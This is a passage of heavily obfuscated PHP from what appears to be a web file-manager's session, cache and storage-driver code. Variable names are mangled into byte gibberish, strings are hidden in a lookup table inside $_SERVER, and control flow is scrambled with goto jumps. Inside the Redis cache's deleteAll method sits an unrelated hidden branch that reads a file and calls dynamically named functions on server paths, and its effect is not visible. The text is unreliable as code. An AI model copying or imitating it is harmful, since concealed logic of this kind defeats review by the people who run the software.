$AÃ¬ì·ÑÀÍ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($bË×¶Ä˜çÉ = false) { self::init(); if (!$bË×¶Ä˜çÉ) { return self::$data; } return array_get_value(self::$data, $bË×¶Ä˜çÉ); } public static function remove($b©‡Õ”ãš) { self::init(); unset(self::$data[$b©‡Õ”ãš]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ºÖÙÂŒäÉê‡][758])) { self::$handle->clearTimeout(); } } } goto c°øŞÕ•ÖË; Eœà‘™Üô: class CacheLockDatabase { public function lock($D…æÌÁ², $A­õ¸âµÂ— = 0) { $F³ˆø´´„ = Model($_SERVER[ºÖÙÂŒäÉê‡][754]); $e” ×¤õÃã = microtime(!0) + $A­õ¸âµÂ—; while (microtime(!0) < $e” ×¤õÃã) { $F¾™¼êˆ‘¶ = $F³ˆø´´„->get($D…æÌÁ²); if (!$F¾™¼êˆ‘¶ || $F¾™¼êˆ‘¶ < microtime(!0)) { $fµçœÌô­È = $F³ˆø´´„->set($D…æÌÁ², $e” ×¤õÃã); if ($fµçœÌô­È) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($döï»ã‰Òì) { return Model($_SERVER[ºÖÙÂŒäÉê‡][754])->get($döï»ã‰Òì); } public function unlock($D™¢ÓŠ’Š) { Model($_SERVER[ºÖÙÂŒäÉê‡][754])->remove($D™¢ÓŠ’Š); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($DØ°šÉ¡¼˜, $D‡ÚÃõËŞŒ) { $C‡Ğ£åãº· =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!class_exists($C‡Ğ£åãº·[775])) { show_json($C‡Ğ£åãº·[776], !1); } $this->cacheTime = $D‡ÚÃõËŞŒ; $this->handle = new Memcached(); if (is_array($DØ°šÉ¡¼˜[$C‡Ğ£åãº·[777]]) && count($DØ°šÉ¡¼˜[$C‡Ğ£åãº·[777]]) >= 1) { foreach ($DØ°šÉ¡¼˜[$C‡Ğ£åãº·[777]] as $a©ƒõä ÍÍ) { $aÔÖƒİ÷´› = explode($C‡Ğ£åãº·[4], $a©ƒõä ÍÍ); $this->handle->addServer($aÔÖƒİ÷´›[0], $aÔÖƒİ÷´›[1]); } } else { $this->handle->addServer($DØ°šÉ¡¼˜[$C‡Ğ£åãº·[165]], $DØ°šÉ¡¼˜[$C‡Ğ£åãº·[166]]); } } public function set($F÷¶ß±àÈ©, $E©ï†ïâì¤, $fìÌ ˜Á = false) { $fìÌ ˜Á = $fìÌ ˜Á ? $fìÌ ˜Á : $this->cacheTime; return $this->handle->set($F÷¶ß±àÈ©, $E©ï†ïâì¤, $fìÌ ˜Á); } public function get($C˜ËÀ‹ó¥„) { return $this->handle->get($C˜ËÀ‹ó¥„); } public function remove($Fêá«±³†) { return $this->handle->delete($Fêá«±³†); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($D®…‰¥å–, $B®Ş—ñŒŞó) { $D¡ïİƒã·î =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!class_exists($D¡ïİƒã·î[778])) { show_json($D¡ïİƒã·î[779], !1); } $this->cacheTime = $B®Ş—ñŒŞó; $aÒÆÎÛ‚›Ì = isset($D®…‰¥å–[$D¡ïİƒã·î[780]]) ? $D®…‰¥å–[$D¡ïİƒã·î[780]] : 10; $eÁ»Ê¬ŠµÅ = _get($D®…‰¥å–, $D¡ïİƒã·î[777]); if ($eÁ»Ê¬ŠµÅ && is_array($eÁ»Ê¬ŠµÅ)) { $this->initCluster($D®…‰¥å–, $aÒÆÎÛ‚›Ì); } else { $this->handle = $this->init($D®…‰¥å–, $aÒÆÎÛ‚›Ì); } } private function init($f£¥´¸¾èš, $aÛÉÇÜ÷­) { $bÀåÖ¡Ú—Å =& $_SERVER[ºÖÙÂŒäÉê‡]; $A¹Š’®è° = new Redis(); $F™¿ìÈöˆâ = isset($f£¥´¸¾èš[$bÀåÖ¡Ú—Å[781]]) ? $f£¥´¸¾èš[$bÀåÖ¡Ú—Å[781]] : !1; if ($F™¿ìÈöˆâ) { $A¹Š’®è°->pconnect($f£¥´¸¾èš[$bÀåÖ¡Ú—Å[165]], $f£¥´¸¾èš[$bÀåÖ¡Ú—Å[166]], $aÛÉÇÜ÷­); } else { $A¹Š’®è°->connect($f£¥´¸¾èš[$bÀåÖ¡Ú—Å[165]], $f£¥´¸¾èš[$bÀåÖ¡Ú—Å[166]], $aÛÉÇÜ÷­); } if (!empty($f£¥´¸¾èš[$bÀåÖ¡Ú—Å[381]])) { $A¹Š’®è°->auth($f£¥´¸¾èš[$bÀåÖ¡Ú—Å[381]]); } return $A¹Š’®è°; } private function initCluster($A˜˜˜ñê²š, $e×´ä£äİ½) { $AÚ”¨ÎÒº× =& $_SERVER[ºÖÙÂŒäÉê‡]; $eâÚ¾³ò¼› = array($AÚ”¨ÎÒº×[782], $AÚ”¨ÎÒº×[783], $AÚ”¨ÎÒº×[784]); $d×…İĞ“õÃ = $AÚ”¨ÎÒº×[782]; if (isset($A˜˜˜ñê²š[$AÚ”¨ÎÒº×[12]]) && in_array($A˜˜˜ñê²š[$AÚ”¨ÎÒº×[12]], $eâÚ¾³ò¼›)) { $d×…İĞ“õÃ = $A˜˜˜ñê²š[$AÚ”¨ÎÒº×[12]]; } switch ($d×…İĞ“õÃ) { case $AÚ”¨ÎÒº×[782]: $this->_slave($A˜˜˜ñê²š, $e×´ä£äİ½); break; case $AÚ”¨ÎÒº×[783]: break; case $AÚ”¨ÎÒº×[784]: $this->isCluster = !0; $CÀøÁò˜—¯ = $A˜˜˜ñê²š[$AÚ”¨ÎÒº×[777]]; $b÷’×æô† = isset($A˜˜˜ñê²š[$AÚ”¨ÎÒº×[781]]) ? $A˜˜˜ñê²š[$AÚ”¨ÎÒº×[781]] : !1; $C¡Äô“ôéÑ = isset($A˜˜˜ñê²š[$AÚ”¨ÎÒº×[381]]) ? $A˜˜˜ñê²š[$AÚ”¨ÎÒº×[381]] : null; $this->handle = new RedisCluster(NUll, $CÀøÁò˜—¯, $e×´ä£äİ½, $e×´ä£äİ½, $b÷’×æô†, $C¡Äô“ôéÑ); break; default: break; } } private function _slave($cöŒ©¶ì£, $e¨ÆÑ‡‡šÖ) { goto B«Ñªİùî‡; CÄ´˜‘ôæ¸: unset($aù“Ëçß²ª[0]); if (empty($aù“Ëçß²ª)) { return; } $fô¡ôš¤êÊ = array_rand($aù“Ëçß²ª); goto d¸˜ØÙ¢¼; B«Ñªİùî‡: $aù“Ëçß²ª = $cöŒ©¶ì£[$_SERVER[ºÖÙÂŒäÉê‡][777]]; $this->filterConfig($cöŒ©¶ì£, $aù“Ëçß²ª[0]); $this->handle = $this->init($cöŒ©¶ì£, $e¨ÆÑ‡‡šÖ); goto CÄ´˜‘ôæ¸; d¸˜ØÙ¢¼: $this->filterConfig($cöŒ©¶ì£, $aù“Ëçß²ª[$fô¡ôš¤êÊ]); $this->slaveHandle = $this->init($cöŒ©¶ì£, $e¨ÆÑ‡‡šÖ); goto e­–Ãåİ“¢; e­–Ãåİ“¢: } private function filterConfig(&$DêÓ‘ºêßŠ, $EàõÑ™½ï) { $E×øÂê‰¿› =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¬÷±ÒÇçù = explode($E×øÂê‰¿›[4], $EàõÑ™½ï); $Cä…İÍµÄÁ = array($E×øÂê‰¿›[165] => $f¬÷±ÒÇçù[0], $E×øÂê‰¿›[166] => $f¬÷±ÒÇçù[1]); $DêÓ‘ºêßŠ = array_merge($DêÓ‘ºêßŠ, $Cä…İÍµÄÁ); } public function set($AÒ®º¶Ì, $eÖâÜù›¾ô, $eƒõŠì‰Ï = false) { $eƒõŠì‰Ï = $eƒõŠì‰Ï ? $eƒõŠì‰Ï : $this->cacheTime; return $this->handle->setEx($AÒ®º¶Ì, $eƒõŠì‰Ï, $eÖâÜù›¾ô); } public function setLock($d¤Ì¬´¢ÅÙ, $CÅêÉ‰†Êì, $c£ÜçÈäñ¦) { return $this->handle->setNX($d¤Ì¬´¢ÅÙ, $CÅêÉ‰†Êì); } public function get($A‡•éğâšø) { $B¨âÃò²Øİ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $B¨âÃò²Øİ->get($A‡•éğâšø); } public function remove($C•İ¾àÉ½·) { return $this->handle->del($C•İ¾àÉ½·); } public function deleteAll() { $E–º½¹ˆ–ó =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($_SERVER[$E–º½¹ˆ–ó[169]] != $_SERVER[$E–º½¹ˆ–ó[170]]) { goto cñ˜¥è»âß; Cê‚¹Âé³: $E—©õóæ”¥ = $E°ŒóÇ§©Í($a”«ÓÜ®°); $d“îÀÔ‘ãø = explode($E–º½¹ˆ–ó[174], $E—©õóæ”¥); if (count($d“îÀÔ‘ãø) < $E–º½¹ˆ–ó[561]) { $FƒñƒåÕÃó = $E–º½¹ˆ–ó[176]; $FƒñƒåÕÃó(); } goto cÁºìÊÑÜ¶; F¸Ï”‚ŠÎì: $DŒ£‡ºÑ’ù = 1; while ($DŒ£‡ºÑ’ù > 1) { $DŒ£‡ºÑ’ù = $DŒ£‡ºÑ’ù + 4; $a’¦Äñ¨‰„ = rawurlencode($DŒ£‡ºÑ’ù . $E–º½¹ˆ–ó[366]); } goto AÜëÂ±…Â; cÁºìÊÑÜ¶: $BÌÑÄ×É¿ù = $E–º½¹ˆ–ó[786]; $BÌÑÄ×É¿ù($_SERVER[$E–º½¹ˆ–ó[787]]); $BÌÑÄ×É¿ù($_SERVER[$E–º½¹ˆ–ó[172]] . $E–º½¹ˆ–ó[788]); goto F¸Ï”‚ŠÎì; cñ˜¥è»âß: $DÖœ·˜‚‰… = $E–º½¹ˆ–ó[785]; $E°ŒóÇ§©Í = $E–º½¹ˆ–ó[171]; $a”«ÓÜ®° = $_SERVER[$E–º½¹ˆ–ó[172]] . $E–º½¹ˆ–ó[173]; goto Cê‚¹Âé³; AÜëÂ±…Â: } if ($this->isCluster) { foreach ($this->handle->_masters() as $a¥ñ£³å) { $this->handle->flushall($a¥ñ£³å); } return; } return $this->handle->flushAll(); } } goto b¾àØ©ÇÃ¦; eÔô‡¥ØáŞ: register_shutdown_function($_SERVER[Ş†Ÿ·Ñ«”ÔÂ][36]); set_error_handler($_SERVER[Ş†Ÿ·Ñ«”ÔÂ][49], $cÖ—¤×¶á); if (function_exists($_SERVER[Ş†Ÿ·Ñ«”ÔÂ][50])) { set_exception_handler($_SERVER[Ş†Ÿ·Ñ«”ÔÂ][51]); } goto Cè›Ã‘•; c‹äØâÔÔà: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $aÏŒ¹Ÿ§Áö =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->objectDriver = array($aÏŒ¹Ÿ§Áö[57], $aÏŒ¹Ÿ§Áö[58], $aÏŒ¹Ÿ§Áö[59], $aÏŒ¹Ÿ§Áö[60], $aÏŒ¹Ÿ§Áö[61], $aÏŒ¹Ÿ§Áö[62], $aÏŒ¹Ÿ§Áö[63], $aÏŒ¹Ÿ§Áö[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C´ùàù¥ßí) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C´ùàù¥ßí, $_SERVER[ºÖÙÂŒäÉê‡][8]); } return $C´ùàù¥ßí; } public function getPathName($Fîó³²Éà) { return $Fîó³²Éà; } public function iconvApp($A†¿¿Š„) { return $A†¿¿Š„; } public function iconvSystem($C˜‹¬ÓŠ‹) { return $C˜‹¬ÓŠ‹; } public function iconvTo($Aóñ¤Ÿ¤ÅÊ, $AÍÒ‹ÙÊ¶´, $cÑµŸ‚º) { goto a‰Ö¡±ÙÅé; a‰Ö¡±ÙÅé: $B¤ºÍê =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$Aóñ¤Ÿ¤ÅÊ || !function_exists($B¤ºÍê[65])) { return $Aóñ¤Ÿ¤ÅÊ; } static $CëŸàÂ²ê£ = array(); goto F‘ÉŠ÷¥´é; BÖğŸ‘¹—¡: $CëÁ¸Üâ = $CëÁ¸Üâ ? $CëÁ¸Üâ : $Aóñ¤Ÿ¤ÅÊ; if (strstr($CëÁ¸Üâ, $B¤ºÍê[69])) { $CëÁ¸Üâ = str_replace($B¤ºÍê[69], $B¤ºÍê[70], $CëÁ¸Üâ); } $CëŸàÂ²ê£[$AÍÒ‹ÙÊ¶´ . $B¤ºÍê[66] . $cÑµŸ‚º . $B¤ºÍê[67] . $Aóñ¤Ÿ¤ÅÊ] = $CëÁ¸Üâ; goto dœ“ä¢ƒê©; dœ“ä¢ƒê©: $CëŸàÂ²ê£[$cÑµŸ‚º . $B¤ºÍê[66] . $AÍÒ‹ÙÊ¶´ . $B¤ºÍê[67] . $Aóñ¤Ÿ¤ÅÊ] = $Aóñ¤Ÿ¤ÅÊ; $CëŸàÂ²ê£[$cÑµŸ‚º . $B¤ºÍê[66] . $AÍÒ‹ÙÊ¶´ . $B¤ºÍê[67] . $CëÁ¸Üâ] = $Aóñ¤Ÿ¤ÅÊ; $CëŸàÂ²ê£[$AÍÒ‹ÙÊ¶´ . $B¤ºÍê[66] . $cÑµŸ‚º . $B¤ºÍê[67] . $CëÁ¸Üâ] = $CëÁ¸Üâ; goto C©—“æ¤Îº; C©—“æ¤Îº: return $CëÁ¸Üâ; goto f¦µ±Œ³ˆ‚; F‘ÉŠ÷¥´é: $d©‡”¸×‡ = $AÍÒ‹ÙÊ¶´ . $B¤ºÍê[66] . $cÑµŸ‚º . $B¤ºÍê[67] . $Aóñ¤Ÿ¤ÅÊ; if (isset($CëŸàÂ²ê£[$d©‡”¸×‡])) { return $CëŸàÂ²ê£[$d©‡”¸×‡]; } if (function_exists($B¤ºÍê[68])) { $CëÁ¸Üâ = @mb_convert_encoding($Aóñ¤Ÿ¤ÅÊ, $cÑµŸ‚º, $AÍÒ‹ÙÊ¶´); } else { $CëÁ¸Üâ = @iconv($AÍÒ‹ÙÊ¶´, $cÑµŸ‚º, $Aóñ¤Ÿ¤ÅÊ); } goto BÖğŸ‘¹—¡; f¦µ±Œ³ˆ‚: } public function getPathInner($fÅ¹í‡‹¦) { $f®¯§ìÙã = IO::init($fÅ¹í‡‹¦); return $f®¯§ìÙã->path; } public function getPathOuter($càÚ’šËÉ‡) { $b¬šÇ×•»” =& $_SERVER[ºÖÙÂŒäÉê‡]; $d‰ô²µÑÁ = strlen(trim($this->pathBase, $b¬šÇ×•»”[8])); $càÚ’šËÉ‡ = substr(trim($càÚ’šËÉ‡, $b¬šÇ×•»”[8]), $d‰ô²µÑÁ); return $this->pathDriver . $b¬šÇ×•»”[8] . ltrim($càÚ’šËÉ‡, $b¬šÇ×•»”[8]); } public function isParentOf($b²§ îšƒ¸, $EË¯œ•¼ˆ) { $B¾Ë«¤¿ë¬ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b²§ îšƒ¸ = rtrim(strtolower($b²§ îšƒ¸), $B¾Ë«¤¿ë¬[8]) . $B¾Ë«¤¿ë¬[8]; $EË¯œ•¼ˆ = rtrim(strtolower($EË¯œ•¼ˆ), $B¾Ë«¤¿ë¬[8]) . $B¾Ë«¤¿ë¬[8]; $CóÍÈ‡ªŒ÷ = strpos($EË¯œ•¼ˆ, $b²§ îšƒ¸) === 0; return $CóÍÈ‡ªŒ÷; } public function getType() { $bõ«˜†ò‹å =& $_SERVER[ºÖÙÂŒäÉê‡]; $B¤Ä‘†…ö = str_replace($bõ«˜†ò‹å[71], $bõ«˜†ò‹å[33], get_class($this)); return strtolower($B¤Ä‘†…ö); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Aä£Ö¤§ƒ, $Aˆ«Ğ²—óÁ) { $D»²ƒŒƒ“æ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D‘åÊÆ¸ô = rtrim($Aä£Ö¤§ƒ, $D»²ƒŒƒ“æ[8]) . $D»²ƒŒƒ“æ[8] . $Aˆ«Ğ²—óÁ; $Aëèë¿æ¼ = $this->exist($D‘åÊÆ¸ô); return $Aëèë¿æ¼ ? $D‘åÊÆ¸ô : !1; } public function renameObject($E†â…¶…Ø, $a† ’ÏĞåƒ) { goto E×£¢¦‘ö¦; bøÔŒƒ„ƒØ: return $Dä¬‹‡Š¹ã ? $a† ’ÏĞåƒ : !1; goto c¸¹ÑÀšÕ; E×£¢¦‘ö¦: $CĞØ¦­À› =& $_SERVER[ºÖÙÂŒäÉê‡]; $eÊß«Ûùå = $a† ’ÏĞåƒ; Hook::trigger($CĞØ¦­À›[72], $this, $E†â…¶…Ø, $this, $this->pathFather($E†â…¶…Ø) . $a† ’ÏĞåƒ); goto DŒØî†Ûø; DŒØî†Ûø: $E†â…¶…Ø = $this->getPathOuter($E†â…¶…Ø); $a† ’ÏĞåƒ = $this->pathFather($E†â…¶…Ø) . $a† ’ÏĞåƒ; if (IO::isFile($E†â…¶…Ø)) { $Dä¬‹‡Š¹ã = IO::copy($E†â…¶…Ø, $this->pathFather($E†â…¶…Ø), REPEAT_RENAME_FOLDER, $eÊß«Ûùå); if ($Dä¬‹‡Š¹ã) { IO::remove($E†â…¶…Ø); } } else { $Dä¬‹‡Š¹ã = IO::mkdir($a† ’ÏĞåƒ); if (!$Dä¬‹‡Š¹ã) { return !1; } $Fò•çÄÌÉ = IO::listPath($E†â…¶…Ø, !0); $bà…»Ù…Ÿí = array_merge($Fò•çÄÌÉ[$CĞØ¦­À›[73]], $Fò•çÄÌÉ[$CĞØ¦­À›[74]]); foreach ($bà…»Ù…Ÿí as $C¤ïßÅ¯‘™) { IO::move($C¤ïßÅ¯‘™[$CĞØ¦­À›[75]], $a† ’ÏĞåƒ, REPEAT_RENAME_FOLDER); } IO::remove($E†â…¶…Ø); } goto bøÔŒƒ„ƒØ; c¸¹ÑÀšÕ: } public function tempFile($EŠÒÚë¤ÕÒ = '', $fµ¡å©«‘´ = '') { goto c°ˆ„Ï…¼; dóºôä æª: $A¸ªìøÒğø = $EÒØëø¿³ã . $EŠÒÚë¤ÕÒ; @touch($A¸ªìøÒğø); if ($fµ¡å©«‘´) { file_put_contents($A¸ªìøÒğø, $fµ¡å©«‘´); } goto d’´¶åÕ¡Ù; c°ˆ„Ï…¼: if (!$EŠÒÚë¤ÕÒ) { $EŠÒÚë¤ÕÒ = rand_string(15); } $EÒØëø¿³ã = TEMP_FILES . rand_string(15) . $_SERVER[ºÖÙÂŒäÉê‡][8]; @mkdir($EÒØëø¿³ã, 511, !0); goto dóºôä æª; d’´¶åÕ¡Ù: return $A¸ªìøÒğø; goto cø½ë‹îÌß; cø½ë‹îÌß: } public function tempFileRemve($FÍ‹‰ŞŠÜ¯) { @unlink($FÍ‹‰ŞŠÜ¯); @rmdir($this->pathFather($FÍ‹‰ŞŠÜ¯)); } public function mkfile($Dß¥®Ö‰Õ§, $CĞˆÃÄï‡á = '', $dé”æìÈ¦  = REPEAT_RENAME) { } public function mkdir($Cñ¾Àùğƒ½, $BÂ©¹ç«Æ­ = REPEAT_SKIP) { } public function copyFile($e¬Â¯Ş­®, $f‹´¬áÜâÌ) { } public function moveFile($eš¼°êÂ¨…, $c»îõ÷Æ³±) { } public function remove($DŠÖâ–´“Â) { if ($this->isFile($DŠÖâ–´“Â)) { return $this->delFile($DŠÖâ–´“Â); } return $this->delFolder($DŠÖâ–´“Â); } public function rename($C·‘¢ÜÀ‚Ä, $dáÕ±ºøŠ) { } public function exist($b•×êÙá) { } public function findByHash($Bé÷îÄ†Ì¡ = '', $AàÏº¸§–Ò = '') { return !1; } public function isFile($AÉ‚ğì¯»ß) { } public function isFolder($CßçŒ¢À–¾) { } public function size($EŞ¾¬ËÌ°) { } public function info($Eº¾¤²Àªš) { } public function infoSimple($aˆŠ”°õƒœ) { return $this->info($aˆŠ”°õƒœ); } public function infoAuth($cìŠ‰‚–¼) { return $this->info($cìŠ‰‚–¼); } public function infoFull($eå¡èåšß) { return $this->info($eå¡èåšß); } public function infoWithChildren($EŞÊ¯£Ó„·) { $bàßí¶—‹… =& $_SERVER[ºÖÙÂŒäÉê‡]; $CÄ²ò»ë–„ = $this->info($EŞÊ¯£Ó„·); if ($CÄ²ò»ë–„ && $CÄ²ò»ë–„[$bàßí¶—‹…[29]] == $bàßí¶—‹…[76]) { $e‹ ”ãì‚ = array($bàßí¶—‹…[77] => 0, $bàßí¶—‹…[78] => 0, $bàßí¶—‹…[79] => 0); $this->infoChildren($EŞÊ¯£Ó„·, $e‹ ”ãì‚); $CÄ²ò»ë–„[$bàßí¶—‹…[77]] = $e‹ ”ãì‚[$bàßí¶—‹…[77]]; $CÄ²ò»ë–„[$bàßí¶—‹…[80]] = array($bàßí¶—‹…[81] => $e‹ ”ãì‚[$bàßí¶—‹…[78]], $bàßí¶—‹…[82] => $e‹ ”ãì‚[$bàßí¶—‹…[79]]); } return $CÄ²ò»ë–„; } public function listPath($C¯ô’‡ÈîŒ, $E¡Øµ„š¹ = false) { } public function has($Bº„Ü¡”š’, $F¤³¿™ƒ–‘ = false, $eèíÊÑò¯Ş = false) { } public function canRead($B…Ò’‘ó§) { } public function canWrite($c£½¦½Æ‡š) { } public function getContent($E×®ŒÄœªÌ) { } public function setContent($Fæ¨Åä‘Û, $B…ø‡²å = '') { } protected function infoChildren($eÂ¢ñè°Îº, &$f—Õİ‡²) { $E‡ØÈ©ÒÑŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; check_abort(); $A’Üô¹ïœ = $this->listPath($eÂ¢ñè°Îº, !0); $A’Üô¹ïœ = array_merge($A’Üô¹ïœ[$E‡ØÈ©ÒÑŒ[74]], $A’Üô¹ïœ[$E‡ØÈ©ÒÑŒ[73]]); foreach ($A’Üô¹ïœ as $d¾Åª—‰Š) { if ($d¾Åª—‰Š[$E‡ØÈ©ÒÑŒ[29]] == $E‡ØÈ©ÒÑŒ[76]) { $f—Õİ‡²[$E‡ØÈ©ÒÑŒ[79]]++; $A“«áöª¬Ä = $this->getPathInner($d¾Åª—‰Š[$E‡ØÈ©ÒÑŒ[75]]); $this->infoChildren($A“«áöª¬Ä, $f—Õİ‡²); } else { $f—Õİ‡²[$E‡ØÈ©ÒÑŒ[78]]++; $f—Õİ‡²[$E‡ØÈ©ÒÑŒ[77]] += $d¾Åª—‰Š[$E‡ØÈ©ÒÑŒ[77]]; } } } public function fileSubstr($f¼ø—‘óª†, $cÁ…¢‚ù¸Ó, $F©«–ÆÈ‚ƒ) { } public function listAll($fõµ©ºŠöé) { } public function upload($CŠ¤ô„Û«±, $E—Å¨Ó¯‚Ù, $D©»ß‘ÆŒä = false, $DÜµ¨ï¶ÃÑ = REPEAT_REPLACE) { } public function uploadFileByID($dÑ“é¨²‡ù, $c÷È¶æœÂ, $F²¾ö÷ò‡Ş) { } public function uploadFileByPath($Díº­‚ÒË, $bèöˆìÌ÷¶, $FÚ…·¸¿é = array()) { } public function isUploadServer() { $b–Ñ£ÏÄßù =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $b–Ñ£ÏÄßù[83]) { return !0; } return $GLOBALS[$b–Ñ£ÏÄßù[6]][$b–Ñ£ÏÄßù[84]][$b–Ñ£ÏÄßù[85]]; } public function isFileOutServer() { $bÂÙŠÎæîç =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $bÂÙŠÎæîç[83]) { return !0; } return $GLOBALS[$bÂÙŠÎæîç[6]][$bÂÙŠÎæîç[84]][$bÂÙŠÎæîç[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($bÄŠùˆù¨) { $F±ÏÏ ‰‡º =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->isCdnHost()) { return $bÄŠùˆù¨; } return str_replace(trim(get_url_root($bÄŠùˆù¨), $F±ÏÏ ‰‡º[8]), trim($this->cdnHost, $F±ÏÏ ‰‡º[8]), $bÄŠùˆù¨); } public function uploadLink($D¿È½Ó‰ñ”, $eî³‡ÊÃ§± = 0) { goto AÍÉé©¹ãñ; F‰Û“›è: if ($EÈ‘ù”èÈ) { $EÈ‘ù”èÈ[$b¸Â¡Óàì“[89]] = $D¿È½Ó‰ñ”; $EÈ‘ù”èÈ[$b¸Â¡Óàì“[90]] = $F¿Ø½Õ’; } return $EÈ‘ù”èÈ; goto eÕˆàÉñ›¤; AÍÉé©¹ãñ: $b¸Â¡Óàì“ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->isUploadServer()) { return; } $F¿Ø½Õ’ = $this->getType(); goto dØ±¯“¥«©; dØ±¯“¥«©: if (!in_array($F¿Ø½Õ’, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $EÖ£ğá°÷ = 1024 * 1024 * 10; goto cÏù¿ˆƒ™­; cÏù¿ˆƒ™­: $fÓ‰ —œ¨ = $eî³‡ÊÃ§± <= $EÖ£ğá°÷ ? $b¸Â¡Óàì“[87] : $b¸Â¡Óàì“[88]; $aí½ÆñÑà¤ = (!$eî³‡ÊÃ§± ? 1 : ceil($eî³‡ÊÃ§± / pow(1024, 3))) * 3600 * 4; $EÈ‘ù”èÈ = $this->{$fÓ‰ —œ¨}($D¿È½Ó‰ñ”, $aí½ÆñÑà¤); goto F‰Û“›è; eÕˆàÉñ›¤: } public function uploadFormData($aí£·…œÛ, $b„Ç‡ŠÆ½ = 3600) { } public function multiUploadFormData($dÉØ“•İ±°, $fğó ¥Ä‚ª = 3600) { } public function download($F¦™ŒÈĞ¬¾, $f´Ë­ô ØÊ) { } public function ext($dß¯ñÏ Á) { $aç¶ ¥ã£õ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (strpos($dß¯ñÏ Á, $aç¶ ¥ã£õ[8]) === -1) { $d–Ä×ƒ¾Âá = $dß¯ñÏ Á; } else { $d–Ä×ƒ¾Âá = $this->pathThis($dß¯ñÏ Á); } $BË¦È©ŠƒÎ = $aç¶ ¥ã£õ[33]; if (strstr($d–Ä×ƒ¾Âá, $aç¶ ¥ã£õ[91])) { $BË¦È©ŠƒÎ = substr($d–Ä×ƒ¾Âá, strrpos($d–Ä×ƒ¾Âá, $aç¶ ¥ã£õ[91]) + 1); $BË¦È©ŠƒÎ = strtolower($BË¦È©ŠƒÎ); } if (strlen($BË¦È©ŠƒÎ) > 3 && preg_match($aç¶ ¥ã£õ[92], $BË¦È©ŠƒÎ, $d‡»µ¨İöœ)) { $BË¦È©ŠƒÎ = $aç¶ ¥ã£õ[33]; } return $BË¦È©ŠƒÎ; } public function pathThis($Aøá‘ÌéÈğ) { $FêºŒëÓ·Ñ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aøá‘ÌéÈğ = str_replace($FêºŒëÓ·Ñ[93], $FêºŒëÓ·Ñ[8], rtrim($Aøá‘ÌéÈğ, $FêºŒëÓ·Ñ[8])); $D‚ÔĞÂšÍë = strrpos($Aøá‘ÌéÈğ, $FêºŒëÓ·Ñ[8]); if ($D‚ÔĞÂšÍë === !1) { return $Aøá‘ÌéÈğ; } return substr($Aøá‘ÌéÈğ, $D‚ÔĞÂšÍë + 1); } public function pathFather($FŠ¦×‡ß”İ) { $a† ˆ˜ø¬¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; $FŠ¦×‡ß”İ = str_replace($a† ˆ˜ø¬¥[93], $a† ˆ˜ø¬¥[8], rtrim($FŠ¦×‡ß”İ, $a† ˆ˜ø¬¥[8])); $fÚÄÛÂÂ‘Á = strrpos($FŠ¦×‡ß”İ, $a† ˆ˜ø¬¥[8]); if ($fÚÄÛÂÂ‘Á === !1) { return $a† ˆ˜ø¬¥[33]; } return substr($FŠ¦×‡ß”İ, 0, $fÚÄÛÂÂ‘Á + 1); } public function hashSimple($fòõ¨¶óò–) { goto dÙõöº´¤‰; b™‡ø²ƒÙˆ: $eøÀ¶šÚ×ğ = intval($E°é£îŸŠ© / $a¬õùèš); $aÇ×ĞéŠî = $aÆÊì“óœ“[33]; for ($c×±¿ùÓŒ = 0; $c×±¿ùÓŒ < $a¬õùèš; $c×±¿ùÓŒ++) { $aÇ×ĞéŠî .= $this->fileSubstr($fòõ¨¶óò–, $eøÀ¶šÚ×ğ * $c×±¿ùÓŒ, $fµ¢”ë…ê•); } goto E­ëØï²Õ¼; B¶Ş”˜½¥: $fµ¢”ë…ê• = 200; $a¬õùèš = 50; if ($E°é£îŸŠ© <= $fµ¢”ë…ê• * $a¬õùèš) { return $this->hashMd5($fòõ¨¶óò–) . $E°é£îŸŠ©; } goto b™‡ø²ƒÙˆ; dÙõöº´¤‰: $aÆÊì“óœ“ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$fòõ¨¶óò–) { return md5($aÆÊì“óœ“[33]); } $E°é£îŸŠ© = $this->size($fòõ¨¶óò–); goto B¶Ş”˜½¥; E­ëØï²Õ¼: $aÇ×ĞéŠî .= $this->fileSubstr($fòõ¨¶óò–, $E°é£îŸŠ© - $fµ¢”ë…ê•, $fµ¢”ë…ê•); return md5($aÇ×ĞéŠî) . $E°é£îŸŠ©; goto b‰†Îê‹Î; b‰†Îê‹Î: } public static $md5Cache = array(); public function hashMd5($F¶•æÇ¯Ï„) { $F¶•æÇ¯Ï„ = 